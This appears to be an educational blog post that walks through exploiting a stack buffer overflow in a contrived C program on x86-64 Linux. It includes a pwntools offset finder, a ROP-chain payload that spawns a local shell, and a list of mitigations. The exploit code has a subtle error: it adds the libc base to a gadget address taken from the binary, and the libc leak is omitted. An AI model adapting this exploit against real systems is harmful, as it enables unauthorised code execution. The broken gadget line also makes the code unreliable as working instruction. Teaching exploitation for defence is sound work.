## Introduction

Stack buffer overflows are one of the oldest vulnerability classes in software security, yet they remain relevant in 2026 — particularly in legacy codebases, embedded systems, and poorly audited C libraries. Modern mitigations such as ASLR, NX/DEP, and stack canaries raise the bar considerably, but they are not insurmountable.

In this post, we walk through the full exploitation lifecycle of a contrived but realistic stack buffer overflow, from discovery to a working shell, on a modern x86-64 Linux system.

## The Vulnerable Program

Consider the following <Tooltip client:load content="C is a programming language"><b><i>C</i></b></Tooltip> program:

```c
#include <stdio.h>
#include <string.h>

void greet(char *name) {
    char buf[64];
    strcpy(buf, name);  // no bounds check
    printf("Hello, %s\n", buf);
}

int main(int argc, char **argv) {
    if (argc < 2) return 1;
    greet(argv[1]);
    return 0;
}
```

The vulnerability is straightforward: `strcpy` copies user-controlled input into a fixed-size stack buffer with no length validation. Supplying more than 64 bytes of input will overflow `buf` and overwrite adjacent stack data — including the saved return address.

## Finding the Offset

We need to determine how many bytes it takes to reach the saved return address. Using a cyclic pattern:

```python
from pwn import *

io = process(['./vuln', cyclic(128)])
io.wait()

core = io.corefile
offset = cyclic_find(core.fault_addr)
print(f"Offset to RIP: {offset}")
```

Running this gives us an offset of **72 bytes** — 64 for the buffer plus 8 bytes of saved base pointer.

## Building the ROP Chain

Since NX prevents executing code on the stack, we redirect execution through existing executable gadgets in the binary and libc. Our goal is to call `system("/bin/sh")`.

We need three things:

- The address of `system()` in libc
- The address of the string `/bin/sh` in libc
- A `pop rdi; ret` gadget to load the argument into `rdi`

```python
from pwn import *

elf  = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop  = ROP(elf)

# Leak libc base via plt/got (omitted for brevity)
libc_base = leak_libc_base()

system   = libc_base + libc.sym['system']
bin_sh   = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi  = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

payload  = b'A' * 72          # padding to RIP
payload += p64(ret_gadget)    # stack alignment
payload += p64(pop_rdi)       # pop rdi; ret
payload += p64(bin_sh)        # rdi = &"/bin/sh"
payload += p64(system)        # call system("/bin/sh")

io = process(['./vuln', payload])
io.interactive()
```

The `ret` gadget before `pop rdi` is a common requirement on x86-64: `system()` in glibc requires 16-byte stack alignment at the point of the call instruction, and adding a single `ret` trampoline fixes this without affecting semantics.

## Mitigations and Takeaways

A fully hardened binary would have made this significantly harder:

- **Stack canary** would detect the overflow before the return and abort cleanly
- **PIE** would randomise the binary's base address, preventing static ROP gadget addresses
- **Full RELRO** would make GOT overwrites impossible
- **Safe string functions** (`strncpy`, `strlcpy`) would prevent the overflow entirely

The root fix is always the same: **validate input length before copying into fixed-size buffers**. The mitigations are defence-in-depth, not substitutes for correct code.
